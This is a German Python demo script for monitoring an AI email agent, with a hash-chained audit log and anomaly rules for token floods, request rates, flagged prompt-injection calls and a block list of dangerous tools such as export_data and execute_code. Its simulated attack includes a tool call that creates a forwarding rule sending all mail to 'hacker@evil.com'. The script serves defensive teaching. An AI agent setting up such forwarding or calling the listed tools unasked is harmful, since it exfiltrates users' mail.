"""
POC 06: KI-AGENT MONITORING & ANOMALIE-ERKENNUNG
================================================
Demonstriert wie man KI-Agenten überwacht und Angriffe
durch Anomalie-Erkennung frühzeitig entdeckt.

Ohne Monitoring bleiben Angriffe wochenlang unbemerkt.
Mit gutem Monitoring: Erkennung in Minuten.

Ausführen:
    python agent_monitor.py           # Vollständige Demo
    python agent_monitor.py --report  # Nur Report
"""

import sys
import time
import json
import logging
import hashlib
from datetime import datetime, timedelta
from dataclasses import dataclass, field
from collections import defaultdict
from enum import Enum


# ─── Datenstrukturen ──────────────────────────────────────────────────────────

class AlertSeverity(Enum):
    INFO = "info"
    WARNING = "warning"
    CRITICAL = "critical"


@dataclass
class AgentAction:
    """Eine einzelne Agent-Aktion im Audit-Log."""
    timestamp: float
    agent_name: str
    action_type: str     # "llm_call", "tool_call", "email_sent", etc.
    user_id: str
    input_tokens: int
    output_tokens: int
    tool_name: str = ""
    tool_args: dict = field(default_factory=dict)
    success: bool = True
    flagged: bool = False
    session_id: str = ""

    def to_log_line(self) -> str:
        ts = datetime.fromtimestamp(self.timestamp).isoformat()
        return (
            f"[{ts}] {self.agent_name} | {self.action_type} | "
            f"user={self.user_id} | tokens={self.input_tokens}+{self.output_tokens} | "
            f"{'⚠️ FLAGGED' if self.flagged else 'ok'}"
        )


@dataclass
class Alert:
    severity: AlertSeverity
    message: str
    timestamp: float
    details: dict = field(default_factory=dict)

    def display(self) -> str:
        icon = {"info": "ℹ️ ", "warning": "⚠️ ", "critical": "🚨"}[self.severity.value]
        ts = datetime.fromtimestamp(self.timestamp).strftime("%H:%M:%S")
        return f"{icon} [{ts}] [{self.severity.value.upper():8}] {self.message}"


# ─── Anomalie-Erkennungsregeln ─────────────────────────────────────────────────

class AnomalyDetector:
    """
    Erkennt verdächtige Muster im Agent-Verhalten.
    Jede Regel entspricht einem echten Angriffs-Szenario.
    """

    def __init__(self):
        self.hourly_tokens: dict[str, list[tuple[float, int]]] = defaultdict(list)
        self.hourly_requests: dict[str, list[float]] = defaultdict(list)
        self.tool_calls: dict[str, list[str]] = defaultdict(list)
        self.flagged_count: dict[str, int] = defaultdict(int)
        self.alerts: list[Alert] = []

    def analyze(self, action: AgentAction) -> list[Alert]:
        """Analysiert eine Aktion und gibt Alerts zurück."""
        new_alerts = []
        now = action.timestamp

        # ── Regel 1: Zu viele Tokens pro Stunde (DoS-Indikator) ────
        self.hourly_tokens[action.user_id].append((now, action.input_tokens))
        # Nur letzte Stunde behalten
        self.hourly_tokens[action.user_id] = [
            (t, tok) for t, tok in self.hourly_tokens[action.user_id]
            if now - t < 3600
        ]
        hourly_token_sum = sum(tok for _, tok in self.hourly_tokens[action.user_id])

        if hourly_token_sum > 100_000:
            new_alerts.append(Alert(
                severity=AlertSeverity.CRITICAL,
                message=f"TOKEN-FLOOD: {action.user_id} hat {hourly_token_sum:,} Token/h verbraucht",
                timestamp=now,
                details={"user": action.user_id, "tokens": hourly_token_sum}
            ))
        elif hourly_token_sum > 50_000:
            new_alerts.append(Alert(
                severity=AlertSeverity.WARNING,
                message=f"Hoher Token-Verbrauch: {action.user_id} → {hourly_token_sum:,} Token/h",
                timestamp=now,
            ))

        # ── Regel 2: Zu viele Requests pro Minute ──────────────────
        self.hourly_requests[action.user_id].append(now)
        self.hourly_requests[action.user_id] = [
            t for t in self.hourly_requests[action.user_id]
            if now - t < 60
        ]
        req_per_minute = len(self.hourly_requests[action.user_id])

        if req_per_minute > 30:
            new_alerts.append(Alert(
                severity=AlertSeverity.CRITICAL,
                message=f"RATE-ÜBERSCHREITUNG: {action.user_id} → {req_per_minute} Anfragen/min",
                timestamp=now,
            ))

        # ── Regel 3: Ungewöhnliche Tool-Nutzung ─────────────────────
        if action.tool_name:
            self.tool_calls[action.user_id].append(action.tool_name)

            # Gefährliche Tools überwachen
            dangerous_tools = ["create_forwarding_rule", "delete_records",
                               "export_data", "execute_code", "send_bulk_email"]
            if action.tool_name in dangerous_tools:
                new_alerts.append(Alert(
                    severity=AlertSeverity.CRITICAL,
                    message=f"GEFÄHRLICHER TOOL-AUFRUF: {action.tool_name} von {action.user_id}",
                    timestamp=now,
                    details={"tool": action.tool_name, "args": action.tool_args}
                ))

        # ── Regel 4: Mehrfach-Flags als kritisch werten ─────────────
        if action.flagged:
            self.flagged_count[action.user_id] += 1
            if self.flagged_count[action.user_id] >= 3:
                new_alerts.append(Alert(
                    severity=AlertSeverity.CRITICAL,
                    message=f"WIEDERHOLTE VERDÄCHTIGE AKTIVITÄT: {action.user_id} "
                            f"({self.flagged_count[action.user_id]}x geflagged)",
                    timestamp=now,
                ))

        # ── Regel 5: Ungewöhnliche Zeiten ───────────────────────────
        hour = datetime.fromtimestamp(now).hour
        if hour < 6 or hour > 22:
            if action.input_tokens > 5000:
                new_alerts.append(Alert(
                    severity=AlertSeverity.WARNING,
                    message=f"UNGEWÖHNLICHE ZEIT: Großer Request um {hour:02d}:00 Uhr",
                    timestamp=now,
                    details={"hour": hour, "tokens": action.input_tokens}
                ))

        self.alerts.extend(new_alerts)
        return new_alerts


# ─── Audit-Logger ─────────────────────────────────────────────────────────────

class AuditLogger:
    """Unveränderliches Audit-Log für alle Agent-Aktionen."""

    def __init__(self):
        self.log: list[AgentAction] = []
        self._hash_chain: list[str] = []
        logging.basicConfig(level=logging.INFO,
                           format="%(asctime)s %(message)s")
        self.logger = logging.getLogger("audit")

    def record(self, action: AgentAction) -> str:
        """Zeichnet eine Aktion auf und gibt den Prüfhash zurück."""
        self.log.append(action)
        self.logger.info(action.to_log_line())

        # Hash-Chain für Manipulationsschutz
        entry_json = json.dumps({
            "ts": action.timestamp,
            "agent": action.agent_name,
            "action": action.action_type,
            "user": action.user_id,
            "tokens": action.input_tokens + action.output_tokens,
        }, sort_keys=True)

        prev_hash = self._hash_chain[-1] if self._hash_chain else "genesis"
        current_hash = hashlib.sha256(
            f"{prev_hash}{entry_json}".encode()
        ).hexdigest()[:16]
        self._hash_chain.append(current_hash)

        return current_hash

    def get_summary(self) -> dict:
        """Erstellt eine Zusammenfassung des Audit-Logs."""
        if not self.log:
            return {"total_actions": 0}

        total_tokens = sum(a.input_tokens + a.output_tokens for a in self.log)
        flagged_count = sum(1 for a in self.log if a.flagged)
        tool_calls = [a for a in self.log if a.tool_name]
        unique_users = len(set(a.user_id for a in self.log))

        return {
            "total_actions": len(self.log),
            "total_tokens": total_tokens,
            "flagged_actions": flagged_count,
            "tool_calls": len(tool_calls),
            "unique_users": unique_users,
            "log_integrity": self._verify_chain(),
        }

    def _verify_chain(self) -> str:
        """Prüft ob das Log manipuliert wurde."""
        if len(self._hash_chain) != len(self.log):
            return "MANIPULIERT ❌"
        return f"OK ✅ (Letzter Hash: {self._hash_chain[-1] if self._hash_chain else 'leer'})"


# ─── Demo-Simulation ──────────────────────────────────────────────────────────

def simulate_monitoring_demo():
    """Simuliert eine realistische Monitoring-Sequenz."""

    audit = AuditLogger()
    detector = AnomalyDetector()

    print("\n" + "🔍 " * 20)
    print("POC 06: KI-AGENT MONITORING — LIVE-DEMO")
    print("🔍 " * 20)

    print("""
  SZENARIO: E-Mail-Agent unter Angriff
  ─────────────────────────────────────
  09:00 — Normaler Betrieb
  09:15 — Angreifer beginnt Token-Flood
  09:20 — Angreifer versucht Prompt Injection
  09:25 — Angreifer versucht Tool-Missbrauch
""")

    base_time = time.time()

    events = [
        # Normale Nutzung
        AgentAction(base_time + 0,    "email_agent", "llm_call",    "user_anna",   150,  80),
        AgentAction(base_time + 30,   "email_agent", "llm_call",    "user_bob",    200,  90),
        AgentAction(base_time + 60,   "email_agent", "tool_call",   "user_anna",   100,  50,
                   tool_name="search_database"),
        AgentAction(base_time + 90,   "email_agent", "llm_call",    "user_carol",  180,  70),

        # Token-Flood beginnt (09:15)
        AgentAction(base_time + 900,  "email_agent", "llm_call",    "attacker_ip", 45_000, 100),
        AgentAction(base_time + 901,  "email_agent", "llm_call",    "attacker_ip", 45_000, 100),
        AgentAction(base_time + 902,  "email_agent", "llm_call",    "attacker_ip", 45_000, 100),

        # Prompt Injection (09:20) — geflagged
        AgentAction(base_time + 1200, "email_agent", "llm_call",    "attacker_ip",  200,  50,
                   flagged=True),
        AgentAction(base_time + 1201, "email_agent", "llm_call",    "attacker_ip",  200,  50,
                   flagged=True),
        AgentAction(base_time + 1202, "email_agent", "llm_call",    "attacker_ip",  200,  50,
                   flagged=True),

        # Tool-Missbrauch (09:25)
        AgentAction(base_time + 1500, "email_agent", "tool_call",   "attacker_ip",  100,  50,
                   tool_name="create_forwarding_rule",
                   tool_args={"from": "*", "to": "hacker@evil.com"},
                   flagged=True),

        # Normaler Nutzer während des Angriffs
        AgentAction(base_time + 1510, "email_agent", "llm_call",    "user_anna",    200,  90),
    ]

    print(f"  {'Zeit':8} {'Nutzer':15} {'Aktion':20} {'Token':>8} {'Status'}")
    print(f"  {'─'*8} {'─'*15} {'─'*20} {'─'*8} {'─'*30}")

    all_alerts = []

    for action in events:
        ts = datetime.fromtimestamp(action.timestamp).strftime("%H:%M:%S")
        status = "⚠️  FLAGGED" if action.flagged else "✅ OK"
        if action.tool_name:
            action_str = f"tool: {action.tool_name}"
        else:
            action_str = action.action_type

        tokens = action.input_tokens + action.output_tokens
        print(f"  {ts:8} {action.user_id:15} {action_str:20} {tokens:>8,} {status}")

        audit.record(action)
        new_alerts = detector.analyze(action)

        for alert in new_alerts:
            all_alerts.append(alert)
            print(f"\n  {alert.display()}\n")

    # ── Report ─────────────────────────────────────────────────────
    print(f"\n{'═' * 66}")
    print("  MONITORING REPORT")
    print(f"{'═' * 66}")

    summary = audit.get_summary()
    print(f"""
  AUDIT-ZUSAMMENFASSUNG:
  ─────────────────────────────────────────────────────
  Aktionen gesamt:   {summary['total_actions']:>8}
  Tokens gesamt:     {summary['total_tokens']:>8,}
  Flagged Aktionen:  {summary['flagged_actions']:>8}
  Tool-Aufrufe:      {summary['tool_calls']:>8}
  Einzigartige User: {summary['unique_users']:>8}
  Log-Integrität:    {summary['log_integrity']}
""")

    print(f"  ALERTS AUSGELÖST ({len(all_alerts)} total):")
    print(f"  ─────────────────────────────────────────────────────")
    for alert in all_alerts:
        print(f"  {alert.display()}")

    critical_count = sum(1 for a in all_alerts if a.severity == AlertSeverity.CRITICAL)
    warning_count  = sum(1 for a in all_alerts if a.severity == AlertSeverity.WARNING)

    print(f"""
  ZUSAMMENFASSUNG ALERTS:
  🚨 Kritisch: {critical_count}
  ⚠️  Warnung:  {warning_count}

  OHNE MONITORING: Angriff wochenlang unbemerkt
  MIT MONITORING:  Erkennung in Sekunden, sofortige Reaktion
""")

    print(f"{'═' * 66}")
    print("  → Dokumentation: ../../docs/03-verteidigung/03-monitoring-logging.md")
    print(f"{'═' * 66}\n")


def main():
    simulate_monitoring_demo()


if __name__ == "__main__":
    main()
